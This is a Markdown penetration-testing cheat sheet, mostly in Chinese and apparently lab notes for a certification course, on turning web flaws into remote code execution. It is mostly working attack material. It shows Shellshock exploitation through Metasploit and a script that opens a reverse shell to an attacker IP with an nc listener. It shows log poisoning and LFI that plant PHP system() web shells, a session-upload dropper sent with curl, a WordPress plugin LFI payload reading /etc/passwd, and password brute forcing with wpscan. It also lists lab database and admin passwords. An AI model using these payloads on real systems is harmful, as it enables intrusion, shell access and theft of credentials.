Web to RCE
===
🔙 [MENU README](../README.md#note)

# SHELLSHOCK
```
駭客在2014年發現的bash漏洞
在bash裡面執行語法時如果設定一個環境變數
env X='() { :; };
那它後面的指令就會被執行起來
可以在bash中達到任意程式碼執行的效果

在那個時代要做動態網頁需要用CGI(為了建立可變式 HTML 所採用的一種方法之一)的技術
大家用的語言不外乎C、C++、Perl、ShellScript
這時ShellScript就會出一點問題

過去幾十年cgi-bin出過最嚴重的漏洞就只有SHELLSHOCK
所以掃出cgi-bin就要有敏感度會發生什麼事情
```
Enviroment
```bash
# Module 06
# Victim  : Ubuntu Wordpress
# 192.168.0.24
sudo -i
cd /usr/lib/cgi-bin
cat shellshock
# #!/bin/bash
# echo "content-type: text/html"
# echo ""
# echo "This is a demostration of shellshock"
mv shellshock keygen
```
Parrot
```bash
# Attacker: Parrot
# view 192.168.0.24
# Web Entry Point : 
#   1.Path
#   2.Form
#   3.Header

# 1. dirb Path
dirb http://192.168.0.24
# dictionary推薦 : /usr/share/dirb/wordlists/common.txt

# http://192.168.0.24/cgi-bin => 403
# RFC 2616所謂有效的URL : protocol://host.domain.com/path/resource?query
# 目前缺resource

dirb http://192.168.0.24/cgi-bin
# http://192.168.0.24/cgi-bin/keygen


# 2. msfconsole
msfconsole
msf6 > search shellshock
# 5 exploit/mutli/http/apache_mod_cgi_bash_env_execode_cgi Bash Enviroment Variable Code Injection
# exploit/mutli/http/apache_mod_cgi_bash_env_exec
msf6 > use 5
msf6 > show options
msf6 > set RHOSTS 192.168.0.24
msf6 > set RPORT 80
msf6 > set TARGETURI /cgi-bin/keygen
msf6 > exploit
meterpreter > shell
# Get TTY Shell
script -c /bin/bash /dev/null
https://file+.vscode-resource.vscode-cdn.net/c:/Users/Rex/Desktop/GITHUB/PenTest/CPENT-CheatSheet/README.md
# Privillege Escalation
uname -a #低版本PwnKit直接K

```
tool
```bash
wget https://github.com/b4keSn4ke/CVE-2014-6271/raw/main/shellshock.py

python2 shellshock.py -t 172.25.30.5 -u /cgi-bin/keygen -r 172.27.232.2 -p 1234 -s dev_tcp

nc -lvnp 1234
```

# LFI to RCE
Enviroment
```bash
# Parrot
ssh administrator@192.168.0.10 #toor
sudo -i 
cd /var/www/html/
echo '<?php phpinfo(); ?>' >> info.php
echo '<?php include($_GET["file"]); ?>' >> /var/www/html/inc.php

# http://192.168.0.10/inc.php?file =info.php
# http://192.168.0.10/inc.php?file =../../../../../etc/passwd
 

# Apache LOG
chmod 755 -R /var/log/apache2
chmod 775 -R /proc/self/environ
# http://192.168.0.10/inc.php?file =/var/log/apache2/access.log
# 目前可以控制任意檔案瀏覽，那我可不可以控我瀏覽的檔案內容?
# 答案是可以的可以控制Access中的User-Agent
User-Agent:<?php system($_GET[cmd]);?>
# 或者這樣
ssh '<?php system($_GET[cmd]);?>'@172.25.20.6

# http://192.168.0.10/inc.php?file =/var/log/apache2/access.log&cmd=ls
# http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log&cmd=/etc/flag


# Authencation
chmod 775 /var/auth.log  # 身分驗證
ssh '<?php system($_GET['cmd']); ?>'@192.168.0.10
```

# PHP_SESSION_UPLOAD_PROGRESS
> One Line PHP Challenge : https://blog.orange.tw/2018/10/
```
PHP_SESSION_UPLOAD_PROGRESS
PHP有一個檔案上傳的進度的API


1. Inclusion Tragedy
2. Session Tragedy
    PHP會去記錄每個User的狀態，PHP端會去tmp一個Session File
    取決於應用程式的運作User或許可以影響到Session File的Content3
3. CleanUp Tragedy
    Session結束後Session File會被清掉，短暫存在於檔案上傳的期間而已
4. Prefix Tragedy
    上傳時可以決定檔案的前綴

結論 : 在PHP檔案上傳的過程中利用進度條的功能，可以控制Session file的內容，而不需要汙染任何的LOG

```
要打PHP_SESSION_UPLOAD_PROGRESS的條件
```
1. PHP > 5.4
2. Enable File Upload (Default Enabled)
3. Enable File Upload Progress (Default Enabled)
4. Vulnerable to LFI
5. Can include SESSION FILE
    - sess_{PHPSESSID}
    - PHP_SESSION_UPLOAD_PROGRESS
6. Common Path
    - /var/lib/php/sessions/
    - /var/lib/php/session/
    - /tmp/
    - /var/lib/php5/

以上可去phpinfo()慢慢看
```
Attack
```bash
# 1.Garbage File
python -c 'print "A" * 2048 * 1024' >> junk.txt

# 2.Dropper.txt
evildropper:<?php file_put_contents('/tmp/shell.php','<?php system($_GET[3])?>'); ?>

# 3.Test File Upload
# 有趣的是網頁根本沒有實作檔案上傳功能，但只要做出檔案上傳的動作，PHP就會以為有檔案在上傳
curl http://192.168.0.10/inc.php 
-H 'Cookie: PHPSESSID=uploadupload'  #用Cookie控制Server端檔案內容
-F 'PHP_SESSION_UPLOAD_PROGRESS=evildropper' # 上傳的進度條名稱
-F 'files=@junk.txt' # 檔案上傳

# 4.開另外一個Terminal 看檔案上傳是否成功
while true; do (curl -s 'http://<ip_addr>/inc.php?file=/var/lib/php5/sess_uploadupload' | grep evildropper); done

# 5.測試沒問題後，傳真的dropper上去
curl http://<ip_addr>/inc.php -H 'Cookie: PHPSESSID=uploadupload' 
-F 'PHP_SESSION_UPLOAD_PROGRESS=<evildropper.txt' 
-F 'files=@junk.txt'

# 6.上傳成功後，執行Shell
curl -s 'http://<ip_addr>/inc.php?file=/tmp/shell.php&3=id
```

# WordPress - LFI
Environment
```
module 06
192.168.0.10
PHP 5.5.9
WordPress 4.9.1
```
```bash
# FIX Lab
mysql -uroot -pAntarct1cA
update wordpress.wp_options set option_value='http://192.168.0.10/wordpress' where option_name = 'siteurl';
update wordpress.wp_options set option_value='http://192.168.0.10/wordpress' where option_name = 'home';
exit

# Fix File Upload
nano /etc/php5/apache2/php.ini
[Ctrl-W] OR [F6] upload_max_filesize 改個20M
service apache2 restart


http://192.168.0.10/wordpress/wp-admin
> admin / qwerty@123

# plugin
WordPress Plugin Site Editor 1.1.1 - Local File Inclusion
https://www.exploit-db.com/exploits/44340
# plugin本身就是zip檔案，直接裝上去，啟動即可
```
POC
```bash
# Plugin Site Editor 1.1.1 - LFI

http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```
WPscan tool
```bash
wpscan --url http://192.168.0.10/wordpress -e

wpscan --url http://192.168.0.10/wordpress -U mike -P Wordlists/Passwords.txt
```